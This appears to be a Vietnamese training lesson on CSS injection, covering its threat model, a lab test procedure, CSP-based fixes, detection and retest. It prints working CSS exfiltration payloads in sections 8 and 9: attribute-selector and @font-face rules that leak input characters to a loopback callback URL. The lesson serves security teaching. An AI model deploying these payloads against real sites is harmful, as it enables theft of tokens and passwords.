---
schema_version: 1
id: WEB-A05-CSS-INJECTION
title: "CSS Injection"
slug: css-injection
level: intermediate
estimated_minutes: 50
prerequisites:
  - http-fundamentals
  - authorized-security-testing
owasp:
  - A05:2025
cwe:
  - CWE-116
content_status: technical-review
payload_status: static-verified
last_verified: null
---

# CSS Injection

> [!CAUTION]
> Chỉ thực hành trên hệ thống bạn sở hữu hoặc có ủy quyền rõ ràng. Dùng dữ liệu giả, fixture có thể hủy và giới hạn tài nguyên; không gửi payload đến Internet hoặc mục tiêu thật.

## 1. Mục tiêu học tập

Sau bài học, bạn có thể:

- Giải thích CSS Injection bằng root cause thay vì chỉ mô tả hậu quả.
- Nhận diện trust boundary, tài sản, actor và điều kiện cần để lỗi có thể bị khai thác.
- Thực hiện kiểm thử có kiểm soát trong lab local và phân biệt expected result với false positive.
- Chọn kiểm soát gốc, triển khai bản sửa và retest bằng positive, negative và boundary case.

## 2. Kiến thức cần có

- Nắm luồng HTTP request/response của tình huống CSS Injection và cách ứng dụng xử lý input qua các trust boundary.
- Phân biệt authentication, authorization và validation.
- Biết đọc code/configuration trong ngôn ngữ hoặc framework xuất hiện ở ví dụ.
- Có lab local cô lập, dữ liệu giả, log quan sát được và quyền kiểm thử rõ ràng.

## 3. Kiến thức nền tảng

CSS có attribute selector như `^=`, `$=` và `*=` để so khớp giá trị thuộc tính trong DOM. CSS cũng có thể tạo request tài nguyên qua các thuộc tính như `background-image` hoặc `@font-face`. Việc request có xảy ra hay không phụ thuộc selector, style cascade, loại phần tử, cache và chính sách tải tài nguyên của browser. [S1] [S2]

```html
<!-- Secure HTML configuration with Content Security Policy (CSP) -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Normal Operation - CSP style-src and img-src</title>
    <!--
      The HTTP-equiv Content-Security-Policy header restricts style sources
      and prevents external background image requests, neutralizing CSS-based exfiltration.
    -->
    <meta http-equiv="Content-Security-Policy"
          content="default-src 'self'; style-src 'self'; img-src 'self';">
    <link rel="stylesheet" href="/static/css/main.css">
</head>
<body>
    <h1>Welcome to our secure application</h1>
    <!-- CSRF token stored in input element is safe from CSS selector exfiltration -->
    <input type="hidden" id="csrf-token" value="abc123xyz">
</body>
</html>
```

## 4. Mô tả và nguyên nhân gốc

CSS Injection xảy ra khi actor kiểm soát CSS source hoặc một CSS context mà browser sẽ parse. Một selector có thể tạo side channel đối với giá trị thật sự có mặt trong thuộc tính/DOM của fixture; nó không tự đọc live password value hay cookie. Bài chỉ dùng thuộc tính tổng hợp và callback loopback để chứng minh đúng request side effect. [S1] [S2] [S3]

> **Nguồn tham khảo:** các claim kỹ thuật trong bài được gắn marker nguồn; khi áp dụng thực tế, hãy đối chiếu phiên bản/framework đang dùng: [S1], [S2], [S3], [S4].

## 5. Mô hình đe dọa và điều kiện khai thác

- **Tài sản:** giá trị DOM tổng hợp, style tree và request tài nguyên của browser.
- **Actor, xác thực và role:** role user được tùy biến theme; nạn nhân là user fixture đã đăng nhập.
- **Điều kiện khai thác:** CSS do actor kiểm soát được parse trong style context và selector khớp kích hoạt side channel cục bộ.
- **Browser, proxy, framework và phiên bản:** Chromium được pin với victim.lab.test và callback 127.0.0.1:9001; không phụ thuộc server framework; phải lưu image/package version thực tế cùng evidence.
- **Bằng chứng bắt buộc:** cùng correlation ID phải nối input, quyết định kiểm soát và tác động lên đúng tài sản; status code riêng lẻ không đủ. [S1]

## 6. Cơ chế tấn công

Đối với css injection, CSS do actor kiểm soát được parse trong style context và selector khớp kích hoạt side channel cục bộ. Positive case phải chứng minh input đến đúng sink và tạo tác động đã mô tả; negative case khi bật kiểm soát gốc phải bị chặn trước side effect. Kết luận chỉ áp dụng cho môi trường được pin ở mục 5. [S1]

## 7. Kiểm thử trong lab được ủy quyền

1. **Setup:** khởi chạy Chromium được pin với victim.lab.test và callback 127.0.0.1:9001; không phụ thuộc server framework; chỉ nạp dữ liệu tổng hợp, bật log ứng dụng/proxy/datastore và gắn correlation ID.
2. **Baseline:** gửi một input hợp lệ của use case css injection; lưu raw request/response, quyết định policy và trạng thái tài sản trước test.
3. **Input và thao tác:** dùng đúng một payload cốt lõi ở mục 8 trong context đã annotation; thay đổi một biến mỗi lần và tuân thủ request cap.
4. **Expected result:** chỉ coi vulnerable fixture là positive khi log chứng minh cơ chế “CSS do actor kiểm soát được parse trong style context và selector khớp kích hoạt side channel cục bộ”; secure fixture phải chặn trước side effect và boundary input phải fail closed.
5. **Cleanup:** xóa dữ liệu, marker và log của css injection; thu hồi session/cache liên quan, hoàn nguyên snapshot và xác nhận không còn callback/process test.
6. **Giới hạn an toàn:** chỉ chạy trên loopback/`.lab.test`; không dùng target, credential hoặc dữ liệu thật; OOB/DoS/state-changing phải có network/CPU/memory/request cap.

## 8. Payload và phạm vi áp dụng

Các probe dưới đây chỉ dùng attribute/value và glyph tổng hợp, callback bind loopback. [S1]

Các kỹ thuật khai thác CSS Injection phổ biến bao gồm:

*   **CSS Keylogger (Attribute-based Exfiltration)**: Dùng bộ chọn thuộc tính CSS để kiểm tra giá trị của các thẻ `<input>`. Khi giá trị khớp với ký tự kiểm tra, trình duyệt sẽ tải một hình ảnh nền từ máy chủ của kẻ tấn công, gửi ký tự đó đi.
    *   *Payload*:
<!-- claim-source: [S1] -->
<!-- payload-id: WEB-A05-CSS-INJECTION-001 -->
<!-- context: Chromium fixture; attacker CSS is inserted into a same-document style element containing a synthetic input[value] -->
<!-- prerequisites: callback HTTP server bound to 127.0.0.1:9001; outbound network disabled; synthetic value limited to a, b or c -->
<!-- encoding: UTF-8 CSS; URL query values are ASCII and require no additional encoding -->
<!-- expected-result: the loopback callback records exactly one GET whose char value matches the first synthetic input character -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
        ```css
        input[value^="a"] { background: url('http://127.0.0.1:9001/leak?char=a'); }
        input[value^="b"] { background: url('http://127.0.0.1:9001/leak?char=b'); }
        input[value^="c"] { background: url('http://127.0.0.1:9001/leak?char=c'); }
        ```
        Bằng cách kết hợp nhiều bộ chọn khớp chuỗi con, kẻ tấn công có thể lấy cắp từng ký tự của CSRF token hoặc mật khẩu của người dùng khi ứng dụng tự động điền (autofill).
*   **@font-face Exfiltration (unicode-range)**: Khi thuộc tính `value` của input không có sẵn trong DOM (ví dụ người dùng đang gõ phím trực tiếp), kẻ tấn công khai báo font chữ tùy chỉnh trỏ tới máy chủ của họ và giới hạn phạm vi ký tự áp dụng (`unicode-range`). Khi ký tự tương ứng xuất hiện trên màn hình, trình duyệt nạp font chữ từ URL đó và vô tình tiết lộ ký tự vừa nhập.
    *   *Payload*:
<!-- claim-source: [S1] -->
<!-- payload-id: WEB-A05-CSS-INJECTION-002 -->
<!-- context: Chromium fixture; attacker CSS defines a font applied to synthetic text containing lowercase a -->
<!-- prerequisites: callback HTTP server bound to 127.0.0.1:9001; outbound network disabled; font cache cleared before the case -->
<!-- encoding: UTF-8 CSS; unicode-range U+0061 denotes lowercase a -->
<!-- expected-result: rendering the synthetic lowercase a causes at most one GET to /leak?char=a on the loopback callback -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
        ```css
        @font-face {
          font-family: LeakFont;
          src: url('http://127.0.0.1:9001/leak?char=a');
          unicode-range: U+0061; /* Hex for 'a' */
        }
        input { font-family: LeakFont, sans-serif; }
        ```
*   **CSS Timing Side-Channel**: Lợi dụng thời gian xử lý hiển thị đồ họa của trình duyệt. Kẻ tấn công thiết kế các bộ chọn CSS cực kỳ phức tạp (ví dụ lồng nhau hàng nghìn cấp hoặc sử dụng các bộ lọc SVG phức tạp) để làm chậm quá trình dựng trang (rendering) khi điều kiện so khớp đúng. Đo thời gian phản hồi hoặc hoạt động CPU của trình duyệt giúp kẻ tấn công xác định ký tự nào khớp mà không cần nạp tài nguyên từ bên ngoài.

## 9. Code dễ bị lỗi và code an toàn

```html
<!-- === VULNERABLE CODE === -->
<!-- The application directly injects user-controlled style content without validation -->
<html>
<head>
    <style>
        /* User inputted styles are rendered directly here */
        /* If attacker input is: input[value^="sec"] { background: url("http://127.0.0.1:9001/leak?val=sec"); } */
        input[value^="sec"] { background: url("http://127.0.0.1:9001/leak?val=sec"); }
    </style>
</head>
<body>
    <form>
        <input type="text" name="secret_key" value="secret123">
    </form>
</body>
</html>

<!-- === SECURE CODE === -->
<!-- Implements a strict Content Security Policy and prevents inline stylesheet injection -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <!-- SECURE: CSP blocks inline styles and restricts background image loading to self -->
    <meta http-equiv="Content-Security-Policy"
          content="default-src 'self'; style-src 'self'; img-src 'self';">
    <link rel="stylesheet" href="/static/css/main.css">
</head>
<body>
    <form>
        <!-- The CSRF token is not vulnerable to CSS exfiltration under strict CSP -->
        <input type="hidden" name="csrf_token" value="safe_token_value">
    </form>
</body>
</html>
```

## 10. Phát hiện

- Ghi log actor/session, route hoặc operation, object/resource liên quan đến CSS Injection, kết quả policy và correlation ID; không ghi secret hoặc toàn bộ token.
- So sánh authorization/validation failure với baseline hợp lệ và cảnh báo theo chuỗi hành vi, không chỉ theo một chuỗi payload.
- Kết hợp telemetry ứng dụng, reverse proxy và datastore để xác nhận request đã tới sink và có/không có tác động.
- Scanner hoặc WAF alert chỉ là tín hiệu điều tra; không phải bằng chứng duy nhất rằng lỗ hổng tồn tại. [S1]

## 11. Phòng thủ

### Kiểm soát bắt buộc

- Không nhận CSS tự do; chỉ cung cấp thuộc tính theme do server định nghĩa từ allowlist.
- Áp dụng cùng kiểm soát cho mọi route, operation và đường xử lý tương đương; thất bại phải dừng trước side effect.

### Defense-in-depth

Với CSS Injection, các biện pháp dưới đây hỗ trợ giảm blast radius hoặc tăng khả năng phát hiện. Rate limit, UUID khó đoán, WAF, CSP hoặc validation chung không được dùng để thay thế kiểm soát gốc.

- **Tóm tắt**: Tuyệt đối không cho phép người dùng chèn mã CSS trực tiếp, thực thi chính sách bảo mật nội dung (CSP) chặt chẽ và không lưu thông tin nhạy cảm trong thuộc tính hiển thị trực tiếp của DOM.
- **Các bước chi tiết**:
  - Triển khai Content Security Policy (CSP) chặt chẽ: giới hạn nguồn tải CSS (`style-src 'self'`) và cấm tải ảnh từ bên ngoài (`img-src 'self'`).
  - Sử dụng các thư viện vệ sinh CSS chuyên dụng nếu bắt buộc phải cho phép người dùng tải lên stylesheet.
  - Không đặt secret không cần thiết vào DOM. CSP `style-src`/`img-src` phù hợp giúp giảm khả năng nạp style hoặc callback ngoài ý muốn nhưng không thay thế việc không nhận CSS tự do. [S1] [S2]

## 12. Retest

- **Positive case:** với CSS Injection, luồng hợp lệ vẫn hoạt động đúng cho actor và dữ liệu được phép.
- **Negative case:** cùng input/tài nguyên nhưng actor hoặc context không được phép bị từ chối mà không rò rỉ chi tiết nhạy cảm.
- **Boundary case:** kiểm tra giá trị rỗng, cực biên, encoding khác, request lặp, trạng thái phiên hết hạn và đường dẫn/operation tương đương.
- **Telemetry:** xác nhận policy decision, application log, proxy log và datastore side effect khớp correlation ID.
- **Tái kiểm tra:** lưu kịch bản tối thiểu tái hiện lỗi cũ và chứng minh bản sửa không phụ thuộc WAF/rate limit.

## 13. Sai lầm thường gặp

- Chỉ kiểm tra status code hoặc chuỗi phản hồi của CSS Injection mà không xác nhận side effect và log.
- Dùng payload đúng cú pháp nhưng sai DBMS, browser, framework, protocol hoặc injection context.
- Coi UUID, rate limit, WAF, CSP hoặc input validation chung là bản sửa cho một kiểm soát gốc khác.
- Chỉ sửa một route trong khi cùng sink/policy được dùng ở route khác.
- Kết luận lỗ hổng tồn tại khi chưa lưu lại nguồn, phiên bản fixture và bằng chứng quan sát được.

## 14. Tóm tắt và checklist

- [ ] Root cause, hậu quả và kỹ thuật khai thác đã được tách riêng.
- [ ] Actor, role/authentication, trust boundary, công nghệ và phiên bản đã rõ.
- [ ] Payload có ID duy nhất, context, encoding, điều kiện, expected result, risk, validation và source.
- [ ] Code dễ lỗi/an toàn dùng cùng framework, phiên bản và use case.
- [ ] Kiểm soát bắt buộc không bị thay thế bằng defense-in-depth.
- [ ] Positive, negative, boundary case và telemetry đã qua retest.
- [ ] Claim kỹ thuật nhạy cảm có nguồn tham khảo ở mục 17 và mọi link chỉ nằm ở mục 16–17.
- [ ] Cleanup hoàn tất; không còn secret, target thật, callback Internet hoặc dữ liệu khách hàng.

## 15. Giải thích thuật ngữ

- **CSS Injection**: Chèn mã CSS độc hại vào trang web để thao túng giao diện hoặc lấy cắp thông tin.
- **Attribute Selector**: Bộ chọn thuộc tính trong CSS dùng để tìm các thẻ HTML dựa trên giá trị của chúng.
- **CSP (Content Security Policy)**: Chính sách bảo mật nội dung giúp ngăn chặn việc tải tài nguyên trái phép.
- **Exfiltration**: Hành vi rò rỉ hoặc lấy cắp dữ liệu ra bên ngoài hệ thống.
- **CSRF Token**: Giá trị không đoán được, gắn với phiên hoặc request, được server kiểm tra để phân biệt request hợp lệ trong mô hình chống CSRF. [S1]

## 16. Bài liên quan và đọc thêm

- [Cross-Site Scripting (XSS)](../xss/) — Lỗ hổng chèn mã độc HTML/JavaScript vào ứng dụng.

## 17. Tài liệu tham khảo

- **[S1]** OWASP WSTG — Testing for CSS Injection. https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection — phiên bản/trạng thái: latest; truy cập: 2026-07-17.
- **[S2]** OWASP Cross Site Scripting Prevention Cheat Sheet — CSS contexts. https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-17.
- **[S3]** CWE-116 — Improper Encoding or Escaping of Output. https://cwe.mitre.org/data/definitions/116.html — phiên bản/trạng thái: CWE 4.20; truy cập: 2026-07-17.
- **[S4]** OWASP Top 10:2025. https://owasp.org/Top10/2025/ — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-17.
